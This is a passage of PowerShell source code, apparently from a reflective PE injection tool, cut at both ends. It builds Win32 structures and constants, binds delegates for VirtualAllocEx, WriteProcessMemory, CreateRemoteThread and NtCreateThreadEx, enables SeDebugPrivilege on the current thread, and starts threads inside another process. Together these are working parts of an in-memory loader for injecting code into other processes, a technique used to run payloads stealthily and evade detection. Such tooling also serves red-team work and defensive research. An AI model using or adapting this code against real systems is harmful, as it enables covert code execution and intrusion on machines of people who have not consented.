		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Invoke-CreateRemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
